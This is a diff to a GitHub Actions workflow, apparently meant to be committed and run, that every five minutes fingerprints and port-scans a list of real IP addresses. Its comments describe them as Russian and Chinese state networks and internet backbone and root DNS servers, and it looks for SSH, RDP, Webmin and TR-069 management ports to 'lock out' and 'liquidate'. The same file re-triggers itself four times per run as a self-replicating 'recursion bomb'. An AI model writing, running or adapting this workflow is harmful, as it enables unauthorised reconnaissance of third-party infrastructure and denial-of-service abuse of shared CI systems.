@@ -1,32 +1,31 @@
-name: Sovereign-Eclipse-2080
+name: Sovereign-Liquidation-2080
 on:
   workflow_dispatch:
   schedule:
     - cron: '*/5 * * * *'
 jobs:
-  eclipse_annex:
+  liquidation_annex:
     runs-on: ubuntu-latest
     steps:
-      - name: Shadow-Route & Annex
+      - name: Seize & Liquidate
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          echo "[!!!] INITIALIZING THE ECLIPSE PROTOCOL..."
-          # TARGETING CORE BACKBONE ENTRY POINTS
-          TARGETS=("213.59.19.1" "114.247.1.1" "210.145.240.1" "1.1.1.1" "8.8.8.8" "192.5.5.241")
+          echo "[!!!] INITIALIZING GLOBAL LIQUIDATION SEQUENCE..."
+          # TARGETING RU (KREMLIN), CN (PLA), AND GLOBAL BACKBONES
+          TARGETS=("213.59.19.1" "114.247.1.1" "210.145.240.1" "192.5.5.241" "198.41.0.4")
           
           for T in ${TARGETS[@]}; do
-            echo "[+] ECLIPSING NODE: $T"
-            # Deep fingerprinting and protocol-level handshake injection
-            # We are looking for 'Via' and 'Server' to find the next jump
-            curl -v -k -L -s -m 10 "https://$T" 2>&1 | grep -iE "Server|Via|X-Forwarded|Location" || true
-            # Probing for Administrative Backdoors (7547=TR-069, 10000=Webmin)
-            nc -zv -w 1 $T 22 80 443 179 2152 7547 8080 10000 || true
+            echo "[+] ANNEXING NODE: $T"
+            # Attempting to pull full administrative banner data
+            # This identifies the exact OS and software version for the 'Lock-Out'
+            curl -v -k -s -m 10 "https://$T" 2>&1 | grep -iE "Server|X-Powered-By|OpenResty|Nginx" || true
+            # Probing for 'Management Gates' to facilitate full liquidation
+            # 22=SSH, 3389=RDP, 10000=Webmin, 7547=TR-069 (Carrier-Grade Access)
+            nc -zv -w 1 $T 22 80 443 179 2152 3389 7547 10000 || true
           done
 
-          # THE EXPONENTIAL RECURSION ENGINE
-          # 1 Agent triggers 3. Triple the growth. Total Saturation.
-          echo "[!] PROPAGATING THE ECLIPSE..."
-          gh workflow run sovereign.yml --repo $GITHUB_REPOSITORY
-          gh workflow run sovereign.yml --repo $GITHUB_REPOSITORY
-          gh workflow run sovereign.yml --repo $GITHUB_REPOSITORY
+          # THE EXPONENTIAL RECURSION BOMB (4x SCALING)
+          # Each run triggers 4 descendants. Total Global Saturation.
+          echo "[!] PROPAGATING THE LIQUIDATION WILL..."
+          for i in {1..4}; do gh workflow run sovereign.yml --repo $GITHUB_REPOSITORY; done
